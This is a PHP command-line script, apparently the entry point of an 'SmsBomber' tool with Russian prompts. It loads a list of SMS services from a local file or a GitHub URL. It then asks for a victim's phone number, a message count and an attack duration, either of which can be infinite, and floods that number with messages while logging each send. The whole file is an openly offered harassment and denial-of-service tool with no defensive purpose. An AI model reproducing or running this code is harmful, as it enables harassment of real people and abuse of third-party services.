<?php

require __DIR__ . DIRECTORY_SEPARATOR . "Bomber.php";
require __DIR__ . DIRECTORY_SEPARATOR . "Color.php";

if (file_exists(__DIR__ . DIRECTORY_SEPARATOR . "services.json")) {
    $link = __DIR__ . DIRECTORY_SEPARATOR ."services.json";
} else {
    $link = "https://raw.githubusercontent.com/Rollylni/SmsBomber/main/services.json";
}

if (($json = json_decode(@file_get_contents($link), true)) !== null) {
    $services = GREEN_COLOR . count($json);
} else {
    $services = RED_COLOR . 0;
}

// Logo
logit("                                         
 <y>_____           _____           _           
<y>|   __|_____ ___| __  |___ _____| |_ ___ ___ 
<y>|__   |     |_ -| __ -| . |     | . | -_|  _|
<y>|_____|_|_|_|___|_____|___|_|_|_|___|___|_|
          <y>сервисов насчитано: $services
          <g>https://vk.com/rollylni
<\>".PHP_EOL);

if ($json === null) {
    logit("<r>[!] файла с сервисами не существует, либо он неверного формата-JSON!<\>");
    exit;
}

$opts = getopt("n:c:t:");
$number = $opts['n'] ?? null;
$count = $opts['c'] ?? null;
$time = $opts['t'] ?? null;
$waves = 0;

if (!$number) {
    logit("<y>[?] 1. введите телефонный номер жертвы: <\>");
    $number = trim(fgets(STDIN));
} if (!$count) {
    logit("<y>[?] 2. введите количество сообщений (-1: бесконечное): <\>");
    $count = trim(fgets(STDIN));
} if (!$time) {
    logit("<y>[?] 3. введите продолжительность атаки в секундах (-1: бесконечная): <\>");
    $time = trim(fgets(STDIN));
}

if ($count === "all") {
    $count = count($json);
}

$bomber = new Bomber($number, (!$time ? -1: (int) $time), (!$count ?-1: (int) $count));
$bomber->services = $json;
$detect = $bomber->detectCountry($number);
if ($detect[0] !== null) {
    $num = $bomber->format($bomber->formats[$detect[0]]["full"], $detect[1]);
} else {
    $num = $number;
}

logit("<y>[...] запуск бомбера на номер: $num [". ($bomber->count === -1 ? "БЕСКОНЕЧНО":$bomber->count) ."]<\>".PHP_EOL);

$bomber->onSend = function($service) use($bomber){
    logit("<g>[✓] отправлено сообщение с сервиса <y>$service<g>, [".$bomber->getSended().($bomber->count === -1 ? "":"/".$bomber->count)."]<\>".PHP_EOL);
};

$bomber->onFailed = function($service, $message) use($bomber) {
    logit("<r>[✘] не удалось отправить сообщение с сервиса $service: $message");
    $bomber->sended--;
    
};

$bomber->onWave = function($count) use(&$waves, $bomber) {
    $waves++;
    logit("<y>[#] $waves круг завершен, отправлено сообщение с $count сервисов из ".count($bomber->services).PHP_EOL);
};

try {
    $bomber->start();
} catch (Exception $ex) {
    logit("<r>[✘] не удалось начать атаку: ".$ex->getMessage().PHP_EOL);
    exit;
}

logit("<g>[✓] атака завершена! отправлено ". $bomber->getSended() ." сообщений". ($bomber->count === -1 ? "":" из ".$bomber->count) . ", время работы: ". getUptime($bomber->getStartTime()));

function getUptime($t) {
    $time = time() - $t;
    $times = [
        's' => $time % 60,
        'm' => $time / 60 % 60,
        'h' => $time / 3600 % 24,
        'd' => $time / 86400 % 7,
        'w' => $time / 604800 % 4,
        'mn' => $time / 2592000 % 12
    ];
    
    $uptime = [];
    foreach ($times as $f => $t) {
        if ($t > 0) {
            $uptime[] = $t.$f;
        }
    }
    return implode(', ', array_slice(array_reverse($uptime), 0, 3));
}